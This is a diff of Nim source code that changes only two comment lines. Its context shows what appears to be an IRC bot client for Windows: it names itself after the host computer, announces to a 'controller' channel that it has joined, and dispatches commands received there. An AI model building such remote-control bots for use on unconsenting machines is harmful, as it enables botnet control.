@@ -8,7 +8,7 @@ var
     name : string
 name_size = 15*sizeof(WCHAR)
 
-# Nickname is based on computer name
+## Nickname is based on computer name
 if GetComputerName(cast[LPWSTR](addr name_buffer[0]), addr name_size) == 0:
     raise newException(OSError, "Failed to retrieve computer name")
 
@@ -45,7 +45,7 @@ while true:
         if event.origin != target_channel:
           cmdh_handle(event, client)
       if event.raw.contains(":End of /NAMES list."):
-        # notify the controller that the bot has joined
+        ## Notify the controller that the bot has joined
         client.privmsg(target_channel,".")
       
       #if g_dbg: echo(event.raw)
